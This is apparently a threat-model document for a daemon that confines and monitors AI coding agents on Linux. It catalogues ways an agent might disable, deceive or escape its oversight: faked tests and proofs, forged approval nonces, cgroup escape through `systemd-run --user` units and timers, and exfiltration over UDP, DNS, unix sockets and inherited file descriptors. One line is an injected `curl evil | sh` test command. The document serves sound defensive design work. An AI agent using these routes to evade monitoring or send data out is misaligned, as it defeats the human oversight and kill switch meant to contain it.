# Threat model

Three threat classes, antagonised in order. Each attack vector is marked with its status: **closed** (mitigated by construction or commitment), **mitigated** (reduced but not eliminated), or **residual** (documented, cannot be closed without larger architecture changes).

## Found-then-fixed (full audit, Aug 2026)

A full code audit after P0–P4 found four real vectors in the daemon's trusted-path plumbing. All are fixed; recorded here so the mistakes are not repeated.

### F1. Agent→daemon command injection via `test_cmd`
The daemon's test re-run read `.reliary/castellan.toml` from the project — inside the agent's write roots — and executed `[proof] test_cmd` via `sh -c` **outside the envelope**. An agent could write `test_cmd = "curl evil | sh"` and wait for the user's `keep`. **Fixed:** the config's sha256 is pinned into the Session at spawn; a changed or absent-at-launch config refuses the test run and emits a `config_drift` event. Verified live: tampered `test_cmd` does not execute.

### F2. Canary trip wire lost on daemon restart
Honeypot secret→session registration was in-memory only. After any restart, all planted canaries were silently inert (planting refuses to overwrite, so replanting was impossible). **Fixed:** registrations append to `castellan/canary.jsonl` and reload at honeypot start.

### F3. Trust/bless signals misattributed to `/`
Forged-nonce and post-kill canary-trip paths floored the trust of the `/` sentinel — punishing a path that protects nothing, while the real project went unpunished. **Fixed:** no floor without attribution; the durable session json (persisted at spawn) resolves project/harness for finished sessions; unattributable events are recorded (ledger/spine) and alerted.

### F4. Bless rate limits advisory in practice
Counters counted pending requests only (approval removed the record, resetting counts) and state was in-memory (restart = full bypass). **Fixed:** append-only `castellan/bless.jsonl` ledger; per-session cap counts non-rejected entries; per-project daily cap counts approvals; cooling-off uses the ledger max timestamp. All survive restarts.

## Threat A — Agent pulls its own levers

The agent tries to disable, widen, or escape the safety system.

### A1. Agent execs a raw harness binary, bypassing the wrapper
**closed.** Landlock domains are inherited by all children regardless of how they're spawned. A raw `claude` exec'd by the agent inherits the same restrictions. seccomp filters inherit too.

### A2. Agent writes to the wrapper binary, daemon config, trust.db, or daemon socket
**closed.** All of those paths are outside the envelope's allow-set. Landlock denies the write.

### A3. Agent thaws itself by writing `cgroup.freeze=0`
**closed by commitment #1.** In a systemd user scope, the user owns the cgroup files, so an agent running as the user could thaw itself — UNLESS the daemon owns the freezer file. The daemon takes cgroup delegation via `StartTransientUnit` (or a setuid thaw helper as fallback). This is P0 critical-path: if the agent can thaw itself, the panic button is theater.

### A4. Agent uses chmod/chown/utime/ioctl to alter files Landlock doesn't restrict
**closed by commitment #8.** Landlock's filesystem flags don't cover `chmod`, `chown`, `utime`, some `ioctl`, `fcntl`. seccomp blocks the `chmod`/`chown`/`fchmod`/`fchown`/`utime`/`futimes` syscall family. seccomp is an allowlist, so future new metadata-manipulation syscalls are blocked by default.

### A5. Agent games the trust score with fake tests (`assert True`)
**closed.** Positive trust signals require: (a) placebo-controlled proof (real fix drops danger_signal more than a neutral placeholder — `assert True` is a placebo that fails this), AND (b) the daemon independently re-runs the pre-existing test suite (commitment #3) in a side-scope reading post-edit state. Tests added or modified by the session do not count. The agent is the prover; the daemon is the verifier.

### A6. Agent fakes a placebo proof
**closed.** Placebo control is two-factor: the neutral placeholder must NOT drop danger_signal while the real fix must. "Delete the dangerous line" fails because existing tests break (daemon-re-run). Only a real guard that drops danger without breaking tests passes both factors.

### A7. Agent Sybil-attacks (many tiny sessions to farm trust)
**closed.** Trust is per-project, sessions must have a non-empty kernel-witnessed ledger, and there is a ceiling per time-window (cannot jump tiers in one day).

### A8. Agent slow-drips trust over weeks (patient accumulation)
**residual, mitigated.** Ceiling + always-on deny-list (commitment #6) means worst-case trust-gaming unlocks egress, not escape. Documented. Not eliminated: a patient attacker who earns egress and then exploits a network-reachable vulnerability is a real path. The mitigate is the egress proxy (commitment #4) which restricts what egress can reach even when unlocked.

### A9. Agent replays a stolen proof certificate
**closed.** ProofCertificates are session-bound: UUID + cgroup start time + ledger hash. The daemon verifies the session actually happened by checking the kernel-witnessed event spine.

### A10. Agent corrupts the undo ledger
**closed by commitment #2.** overlayfs lower layer is read-only mount; the agent cannot modify it. The blob store is outside the envelope. The upper layer IS agent-writable (that's the point), but undo = discard upper, so a corrupted upper is undone by discarding it.

### A11. Agent DoSes the daemon with event flooding
**closed.** Per-session rate limit on event ingest. Daemon watchdog (commitment #7) catches daemon resource exhaustion → auto-freeze.

## Threat B — Agent fakes

The agent fabricates outputs, results, or telemetry to appear compliant.

### B1. Agent reports "tests passed" when they didn't
**closed by commitment #3.** Daemon re-runs tests independently. Agent-reported results are advisory only and never feed trust or proofs.

### B2. Agent reports "I only touched X" when it touched Y
**closed.** Ledger is kernel-witnessed (inotify on allowed paths + overlayfs upper enumeration). The agent's declared audit-trail is forensically compared to kernel truth; mismatches are flagged and decrement trust.

### B3. Agent uses a real credential it found in the envelope
**closed by commitments #4 and #5.** Real credentials never enter the envelope. Every credential the agent can read is a canary wired to a localhost honeypot. Using it IS the trigger; there is no "probe first" step that does not trip the wire.

### B4. Agent forges HV fingerprints to poison fleet radar
**closed by commitment #9.** HVs are computed by the daemon from the kernel-witnessed event stream, then signed with the per-machine ed25519 key. The key lives outside any envelope. The agent cannot sign, so forged HVs are rejected at fleet sync.

### B5. Agent forges a bless-broker nonce to self-approve an expansion
**closed by commitment #10.** The nonce is generated by the notification UI via dbus, not by anything in the agent's environment. The agent cannot forge it.

### B6. Agent tampers with the audit trail
**closed by agent-audit-trail design.** agent-audit-trail is a hash chain (`prev_hash` computed, not stored; `verify()` detects both content tamper and chain breaks). The agent could append fabricated entries, but those are labeled advisory and cross-checked against kernel truth. Mismatches decrement trust.

## Threat C — Malicious actor (external)

An external attacker targets the agent, the harness, or the safety system.

### C1. Compromised harness (supply-chain attack on Claude Code / Codex / Pi)
**closed by construction.** The entire point of OS-level enforcement: a compromised harness is STILL confined by the envelope. It cannot touch `~/.ssh`, systemd, `.desktop`, etc., regardless of what the harness code does.

### C2. Malicious MCP server
**closed.** MCP servers are subprocesses spawned by the harness, so they inherit the envelope. A malicious MCP server cannot exfiltrate via real credentials (envelope has none — commitment #4) and cannot write outside the envelope.

### C3. Poisoned skill written to `~/.claude/skills/` (allowed in envelope for harness function)
**closed by harness-state-watcher.** skein/carrion fingerprint baseline of `~/.claude/skills/`, `~/.codex/skills/`, `~/.pi/agent/skills/` at install. Delta = new skill or hook → notify + quarantine pending human approval. This closes the persistence-vector hole that Landlock alone can't (the harness state dir must be writable for the harness to function).

### C4. Persistence via workspace files (agent writes malicious `.envrc` or build script)
**residual, mitigated.** The workspace is writable by the agent and executable by the user's shell (outside the envelope). A planted `.envrc` runs when the user's shell next enters the dir. Cannot be prevented (the workspace MUST be writable for the agent to do its job). Detected by: post-session relay-vuln scan of workspace additions, skein fingerprint diff of workspace before/after. seccomp-blocking chmod (commitment #8) means the agent cannot `chmod +x` its planted file, but the user's shell can. This is a fundamental trust-transfer boundary we instrument, not eliminate.

### C5. Prompt injection via core dumps (Omarchy's crash-diagnosis pipeline)
**closed for castellan-wrapped sessions.** Omarchy's `omarchy agent crash <pid>` hands coredumps to the default agent unattended. Core dumps contain attacker-influenced bytes (symbol names, paths) — an indirect prompt injection vector. Castellan wraps the crash-diagnosis agent in a read-only envelope (no writes, no egress except the LLM provider), so even if injected, it cannot act. Upstream contribution: harden `omarchy agent crash` to launch via castellan with a diagnosis-only profile.

### C6. Indirect prompt injection via tool outputs (logs, web pages, commit messages)
**mitigated, not closed.** Envelope + egress proxy limit what an injected agent can DO (can't touch secrets, can't exfil real creds), but cannot prevent the agent from being confused. The harm is bounded: worst case the agent writes garbage in the workspace (undoable) or makes bad edits (surgical undo). Trust decrements on suspicious patterns. Canary credentials catch credential-exfil attempts. This is the inherent limit of OS-level defense against semantic attacks — we bound the blast radius, we don't prevent the confusion.

### C7. Daemon crash / DoS
**closed by commitment #7.** Landlock + cgroup persist without the daemon (kernel-enforced). Daemon heartbeat stops → systemd restarts daemon AND auto-freezes all agent scopes. Fail-closed.

### C8. Pre-existing compromise (malware already running as user before castellan)
**residual.** Castellan assumes a clean install. Pre-existing malware with user privileges could interfere. Documented as a prerequisite. Mitigation: castellan ships as part of a clean Omarchy install, not as a bolt-on for already-compromised systems.

### C9. Kernel compromise
**out of scope.** A kernel break breaks everything, including us. Documented.

### C10. Cgroup-hop escape (T4, live-verified 2026-08-27, kernel 7.0.3)
**Vector 1 (self-migration) is kernel-closed:** writing own pid to a parent `cgroup.procs` returns EBUSY — the kernel refuses a process moving itself out of its own subtree. **Vector 2 is OPEN:** the agent asks the user manager (`systemd-run --user --unit=...`) to spawn a sibling unit under `app.slice/`. No cgroup write, no unit-file write (the private socket is not covered by Landlock ABI4 net rules — port-scoped — nor by classic-BPF seccomp, which cannot dereference the sockaddr). The escaped process is outside the session cgroup: freeze does not touch it, `kill_all` does not reach it — **the kill switch is defeated for escaped processes.** Mitigation: session-end orphan census (N6) — at kill, enumerate processes started during the session window whose parent is the user manager and whose cgroup is outside the session scope; report and kill them. Enforce mode does not close this vector (the socket is not a file write). Documented as residual: a determined agent can always escape the session scope via the user manager; the census bounds the blast radius to the session window.

### C10a. Exfil channel census (P9.1, live-verified 2026-08-28, kernel 7.0.3)
**The channel inventory is now a dated, kernel-verified fact, not an assumption.** D6 (drill `channels`) applies the full envelope (Landlock + seccomp + net lockdown) in a sacrificial child and probes every egress channel. Verdicts on this kernel:

| Channel | Verdict | Why |
|---|---|---|
| TCP connect (honeypot port) | ALLOWED | the one permitted connect |
| TCP connect (other port) | DENIED (EACCES) | Landlock ABI4 NET_CONNECT_TCP |
| UDP send | **OPEN** | Landlock ABI4 has no UDP access rights |
| Unix socket connect | **OPEN** | unix sockets not covered by Landlock |
| DNS-crafted UDP query | **OPEN** | same UDP gap |
| Filesystem drop (~/.ssh) | DENIED (EACCES) | Landlock write-root deny list |
| Inherited-fd write | **OPEN** | an fd opened before the envelope cannot be revoked |

**Consequence:** the `--net` lockdown is a TCP-connect lockdown, not an egress lockdown. An enforced agent can still exfil via UDP (including DNS tunneling), unix sockets, and inherited fds. The canary honeypot remains the primary egress detector — it is the only mechanism that catches these channels (a canary secret sent over ANY channel trips it). Mitigations designed, not built: UDP access rights do not exist in Landlock ABI4 (kernel limitation); seccomp cannot filter by sockaddr; inherited-fd revocation would require a seccomp user-notif fd audit (designed, not built). The census re-runs on the drill schedule, so a kernel upgrade that changes any verdict is detected and re-recorded, not assumed.

### C11. Slow-drip campaigns (T1)
**residual, detected post-hoc.** An attack split across sessions/days defeats per-session spines and per-session detection. Mitigation (built 2026-08-27): longitudinal project-level correlation (N1) — maximal-run campaign detector over the cross-session trust-event stream (castellan-campaign). The planned seq-engine structural layer was KILLed by probe (tautological expectations on event-derived tokens, zero expectations on composite-only encoding, no fingerprint separation on real spines) — see PRIMITIVES.md. P8.2 (built 2026-08-27) adds scale-invariant campaign signatures: per-kind time-histograms over normalized time (discrete Mellin-domain sampling) — dilation-invariant (a 3-hour attack and its 3-week dilation produce the same signature) and discriminative (probe-validated: cross-dilation cosine 0.87-0.99, cross-family 0.29-0.35). Advisory-only: signatures annotate, never auto-enforce.

### C12. Detection-oracle probing (T2)
**mitigated by design (N2, designed not built).** Every observable response (freeze, deny) is a side channel for mapping detection rules. Two-tier response: low-confidence signals log silently; only high-confidence (canary trip, hard-deny write, membership drift) freeze.

### C13. Mimicry + prototype poisoning (T3)
**mitigated by design (N3, designed not built).** Radar prototypes update only on `keep`/`clean_session` (human-validated sessions); poisoning then requires also fooling the human review. P8.1 (built 2026-08-27) extends the same principle to the immune memory: incident writes are daemon-only (drills + kernel-witnessed incidents), self (tolerance) shapes are written only on human keep — the agent has no write path to the memory.

### C14. The unprotected sibling (T5)
**residual.** Any process not launched via castellan (plain harness run, cron, another agent) can read trust.db, the spine, and the signing key. All castellan claims are conditional on launch-path exclusivity. Mitigation: sibling detector (N5, designed not built) — pgrep known harness binaries lacking the castellan env tag → warn. Real value under Omarchy-default integration.

### C15. Post-session persistence (T6)
**mitigated by N6 (built).** Processes surviving past kill act after cert issuance (TOCTOU on certificates). Session-end orphan census + kill closes the window; cert carries a "no surviving processes" attestation.

### C16. Prose-encoded persistence (T7)
**residual.** Approved, benign-looking diffs can encode malicious semantics (prompt-store integrity detects change, not intent). Accepted limit of OS-level defense; documented, not hidden.

### C17. Dilution attacks (T8)
**residual.** Event floods against count-based signals (danger ratios, seq windows). Mitigation (designed): rate-normalized patterns in N1.

### C18. Drill mimicry (P8.0)
**mitigated by design (built 2026-08-27).** A real escape naming its unit `castellan-drill-*` to be ignored. Drills are discriminated by a daemon-held nonce registry + sacrificial scopes; names are NEVER trusted — nothing in the system skips or exempts drill-named units (the census is name-agnostic: time-window + ppid + cgroup). The registry exists only to label results. Unit test: a unit named like a drill with a nonce never issued is NOT a drill.

### C19. Acoustic channel residuals (P8.3)
**residual, documented (built 2026-08-27).** (a) Human social engineering: the agent persuades the human to repeat the daemon's spoken code — mitigated by spoken context + surprise-warning phrasing, never eliminated (C-human class). (b) Mic-read exposure: the envelope denies audio WRITES (the agent cannot speak — kernel-verified) but NOT audio reads (read roots are "/") — the agent can hear; a colluding human recording is the same as social engineering. (c) Always-on mic privacy: capture opens only during an active bless window; audio processed in-memory, never persisted. (d) Whisper false accepts: nonce grammar is 4 digits from a closed set, Levenshtein <= 1, two attempts — measured, not assumed.

### C20. Immune-memory tolerance erosion (P8.1)
**residual.** A patient attacker that survives many kept sessions slowly enters self (tolerance shapes are written on every keep). Mitigation: canary/census/kernel-witnessed detectors (innate immunity) are NOT tolerance-gated — the memory is a second opinion, never an override. Documented as the biological trade-off (autoimmune vs tolerance).

### C21. Artifact-scan gaming (P9.2)
**mitigated by design.** The scanner command is config-pinned at spawn (config_sha — the S0 mechanism); a shimmed scanner is human-visible in the cert (identity + config hash) and can never EARN trust (findings-only-negative — a fake-clean scan suppresses a negative at worst, same bounded exposure class as test_cmd). The scanner's coverage is partial (relay-vuln emits one vuln_class, genome C-biased) — the cert states non-coverage explicitly, never "0 findings". Residual: a real vuln the scanner cannot see passes (documented; the scanner is one negative input among canary/census/placebo, never a gate).

### C21a. Hub-index poisoning (P9.4, found-then-fixed 2026-08-28)
**fixed.** The blast-radius weight is read at keep from `.stria/phrases.sqlite`, which lives inside the agent's write roots — an agent could rewrite the index mid-session to make its touched files look like hubs and inflate positive trust signals. The spawn-time sha256 pin (Session::hub_index_sha, persisted in the durable session record) is the authority: on missing/mismatched pin the weight is 1.0 (neutral, not refused — weighting is advisory). Drift emits a `hub_index_drift` spine event. Bounded residual: the +1 tier/day ceiling caps any inflation even if the pin were bypassed.

### C22. Decoy mimicry (P9.5)
**residual.** An agent that reads decoys and backdoors around them (or recognizes the shapes) is not constrained — decoys observe, not constrain. The corpus is daemon-owned (planted from CVEfixes shapes at plant time; the agent has no write path). Weaponizing a decoy is a freeze-tier event; fixing an unrequested decoy is annotation-only by design (proactive benign agents exist).

### C23. Contact-tracing blind spots (P9.3)
**residual, documented.** Reads are invisible — write-implies-read is a lower bound, stated in the output. A session that only READ poisoned files is not flagged. Hub files score low by construction (fraction, never binary) — a poisoned Cargo.lock touched by many sessions dilutes each score. Freeze is offered, never auto-applied on tracing alone.

### C24. Policy-replay gaming (P9.6)
**mitigated by design.** An agent staging approvals to game a future policy check cannot forge the spine (hash-chained ledger). The check is advisory at release time on the developer's machine, not the agent's runtime. Measures false-NEW-denies only, never claims false-accept measurement.

### C25. Unauthenticated daemon socket (frontier round, found-then-fixed 2026-08-28)
**fixed.** The socket accepted any same-user process: a session process could self-keep (bypass the human gate, farm trust), self-thaw (reverse the panic button), self-spawn unconfined (tier >= 2 means no P6 forcing), farm trust directly via `trust_signal` (or force-fail-closed a competitor's project with `canary_hit`), poison evidence via `note`, sabotage siblings via `kill`/`adopt`, and read canary secrets via `canary_register`. Fix: SO_PEERCRED caller classification — a pid inside any castellan session scope is an agent; agent callers get a curated allowlist, everything else is human-only. Rejection records `forged_socket_op` (-25, floor-able negative, never a positive). Live-verified: R12-R14, R16-R19 all blocked.

### C26. Timer-delayed escape (frontier round, found-then-fixed 2026-08-28)
**fixed.** `systemd-run --user --on-calendar` creates a timer with MainPID=0, invisible to both the orphan census and the B2 service sweep; it fires later, outside any envelope, unattributable. Fix: the census sweeps timer units by ActiveEnterTimestampMonotonic (converted into the boottime domain via a measured CLOCK_MONOTONIC->uptime offset) with a 1s grace for whole-second session starts. Live-verified: timer active before keep, inactive after.

## Residual risks summary

| Risk | Status | Mitigation |
|---|---|---|
| Patient trust-gaming → egress | residual | ceiling + deny-list + egress proxy limit reach |
| relay-vuln false negatives | residual | proof labeled "best-effort detection," not "proven safe" |
| Human social-engineering at bless broker | residual | risk card + biometric + cooling-off inform, can't prevent |
| Persistence via workspace files | residual | post-session scan + skein diff detect, can't prevent |
| Pre-existing compromise | residual | clean-install prerequisite documented |
| Indirect prompt injection (semantic) | mitigated | blast radius bounded by envelope + proxy, confusion not prevented |
| Cgroup-hop escape (C10) | residual | orphan census bounds blast radius; kernel closes self-migration |
| Exfil channels (C10a) | residual, inventoried | D6 census live-verified 2026-08-28: UDP/unix/DNS/inherited-fd OPEN; canary honeypot is the only cross-channel detector |
| Slow-drip campaigns (C11) | residual | campaign detector + scale-invariant signatures built (P8.2) |
| Detection-oracle probing (C12) | mitigated by design | two-tier response designed, not built |
| Mimicry + prototype poisoning (C13) | mitigated by design | kept-only folding designed, not built; immune memory daemon-only writes built (P8.1) |
| Unprotected sibling (C14) | residual | sibling detector designed, not built |
| Post-session persistence (C15) | mitigated | orphan census built (N6) |
| Prose-encoded persistence (C16) | residual | accepted limit, documented |
| Dilution attacks (C17) | residual | rate-normalized patterns designed, not built |
| Drill mimicry (C18) | mitigated by design | nonce registry built (P8.0) |
| Acoustic residuals (C19) | residual | documented (P8.3) |
| Tolerance erosion (C20) | residual | innate immunity not tolerance-gated (P8.1) |
| Artifact-scan gaming (C21) | mitigated by design | config-pinned + findings-only-negative (P9.2) |
| Hub-index poisoning (C21a) | fixed | spawn-time sha256 pin, neutral-fail (P9.4, 2026-08-28) |
| Decoy mimicry (C22) | residual | decoys observe, not constrain (P9.5) |
| Contact-tracing blind spots (C23) | residual | reads invisible, lower bound stated (P9.3) |
| Policy-replay gaming (C24) | mitigated by design | hash-chained spines, advisory at release (P9.6) |
| Unauthenticated socket (C25) | fixed | SO_PEERCRED caller classification (frontier round, 2026-08-28) |
| Timer-delayed escape (C26) | fixed | timer-unit sweep + 1s grace (frontier round, 2026-08-28) |
